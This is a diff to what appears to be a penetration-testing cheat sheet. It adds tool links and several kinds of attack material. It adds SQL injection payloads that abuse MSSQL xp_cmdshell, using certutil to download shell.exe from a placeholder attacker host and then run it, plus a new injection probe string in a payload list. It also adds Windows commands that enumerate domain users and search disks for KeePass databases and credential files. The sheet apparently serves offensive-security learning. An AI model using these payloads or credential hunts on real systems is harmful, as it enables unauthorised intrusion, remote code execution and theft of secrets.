@@ -243,6 +243,7 @@ Thank you for reading.
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
 | mimikatz | https://github.com/gentilkiwi/mimikatz |
 | NetExec | https://github.com/Pennyw0rth/NetExec |
+| ntlm.pw | https://ntlm.pw |
 | Patator | https://github.com/lanjelot/patator |
 | pypykatz | https://github.com/skelsec/pypykatz |
 | RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
@@ -301,6 +302,7 @@ Thank you for reading.
 | RunasCs | https://github.com/antonioCoco/RunasCs |
 | RustHound | https://github.com/OPENCYBER-FR/RustHound |
 | scavenger | https://github.com/SpiderLabs/scavenger |
+| SharpADWS | https://github.com/wh0amitz/SharpADWS |
 | SharpCollection | https://github.com/Flangvik/SharpCollection |
 | SharpHound | https://github.com/BloodHoundAD/SharpHound |
 | SharpView | https://github.com/tevora-threat/SharpView |
@@ -2032,6 +2034,12 @@ SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
 ```
 
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
 ##### Insert Code to get executed
 
 ```c
@@ -2135,6 +2143,7 @@ OK
 ##### Master List
 
 ```c
+';#---              // insert everywhere! Shoutout to xsudoxx!
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -3786,8 +3795,10 @@ rm ./'--checkpoint-action=exec=python script.sh'
 ```c
 systeminfo
 whoami /all
-net users
-net users <USERNAME>
+net user
+net user /domain
+net user <USERNAME>
+tree /f C:\Users\
 tasklist /SVC
 sc query
 sc qc <SERVICE>
@@ -4041,6 +4052,9 @@ reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
 ```c
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
 ```
 
 ###### PowerShell History
